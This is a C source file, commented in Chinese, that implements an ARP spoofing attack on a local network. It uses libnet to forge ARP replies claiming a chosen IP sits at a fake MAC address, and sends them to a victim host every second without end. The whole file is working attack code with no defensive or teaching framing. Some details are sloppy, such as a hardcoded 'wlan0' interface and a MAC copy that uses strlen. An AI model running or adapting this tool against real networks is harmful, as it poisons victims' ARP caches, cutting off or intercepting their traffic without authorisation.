/**
 * file name: arp_deceive.c
 * 一个局域网的ARP欺骗程序
 */

#include <gm_net.h>
#include <libnet.h>
#include <net/if_arp.h>

libnet_t *pnet;
libnet_ptag_t arptag;
libnet_ptag_t ethtag;

/*
 * 函数名： get_mac
 * 功能： 根据接口名和ip地址查找ARP缓存，然后在vic_mac数组中填入对应的MAC地址
 */
static void
get_mac(char *interface, char *ip, uint8_t *vic_mac)
{
    int fd;
    struct arpreq arpreq;
    struct sockaddr_in *sin;

    bzero(&arpreq, sizeof(struct arpreq));
    sin = (struct sockaddr_in *) &arpreq.arp_pa;
    sin->sin_family = AF_INET;
    Inet_pton(AF_INET, ip, &sin->sin_addr);

    fd = Socket(AF_INET, SOCK_DGRAM, 0);
    memcpy(arpreq.arp_dev, interface, strlen(interface));
    /* 查找ARP缓存 */
    Ioctl(fd, SIOCGARP, &arpreq);

    memcpy(vic_mac, &arpreq.arp_ha.sa_data[0], 6);
}

/*
 * 函数名： get_local_mac
 * 功能： 根据接口名，在local_mac中填入本地接口的MAC地址
 */
static void
get_local_mac(char *interface, uint8_t *local_mac)
{
    int fd;
    struct ifreq ifreq;

    fd = Socket(AF_INET, SOCK_DGRAM, 0);
    bzero(&ifreq, sizeof(struct ifreq));
    memcpy(&ifreq.ifr_name, interface, strlen(interface));
    
#ifdef SIOCGIFHWADDR
    Ioctl(fd, SIOCGIFHWADDR, &ifreq);
    memcpy(local_mac, ifreq.ifr_hwaddr.sa_data, strlen(ifreq.ifr_hwaddr.sa_data));
#else
    err_quit("No define SIOCGIFHWADDR");
#endif
}

int
main(int argc, char *argv[])
{
    uint8_t vic_ip[6], vic_mac[6], mod_ip[4], mod_mac[6], local_mac[6], *ptr;
    char errbuf[LIBNET_ERRBUF_SIZE];

    if (argc != 4)
	err_quit("Usage: arp_deceive <interface> <victim ip> <midified ip>");

    /* 初始化各种IP地址和MAC地址 */
    Inet_pton(AF_INET, argv[2], vic_ip);
    get_mac(argv[1], argv[2], vic_mac);
    Inet_pton(AF_INET, argv[3], mod_ip);
    memset(mod_mac, 0xa5, 6);
    get_local_mac(argv[1], local_mac);

    /* 初始化libnet */
    pnet = libnet_init(LIBNET_LINK_ADV, "wlan0", errbuf);
    if (pnet == NULL)
	err_quit("Can't initialize libnet: %s", errbuf);

    /* 构造ARP报文 */
    arptag = libnet_build_arp(
	1,   			/* 以太网地址类型 */
	0x0800,			/* IP地址类型 */
	6,			/* 以太网地址长度 */
	4,			/* IP地址长度 */
	ARPOP_REPLY,		/* ARP响应 */
	mod_mac,     /* 发送主机的MAC地址*/
	mod_ip,	     /* 发送主机的IP地址 */
	vic_mac,     /* 目标主机的MAC地址 */
	vic_ip,	     /* 目标主机的IP地址 */
	NULL,
	0,
	pnet,
	0);

    if (arptag == -1)
	err_quit("arptag error");
    
    /* 构造以太网头部 */
    ethtag = libnet_build_ethernet(
	vic_mac,		/* 目标主机的MAC地址 */
	local_mac,		/* 发送主机的MAC地址 */
	0x0806,			/* 以太网帧类型，这里是ARP */
	NULL,
	0,
	pnet,
	0);

    if (ethtag == -1)
	err_quit("ethtag error");

    /* 每隔一秒就写出一个帧 */
    for (; ; ) {
	if (libnet_write(pnet) < 0)
	    printf("lost packet\n");
	sleep(1);
    }
    
    libnet_destroy(pnet);
    
    return 0;
}
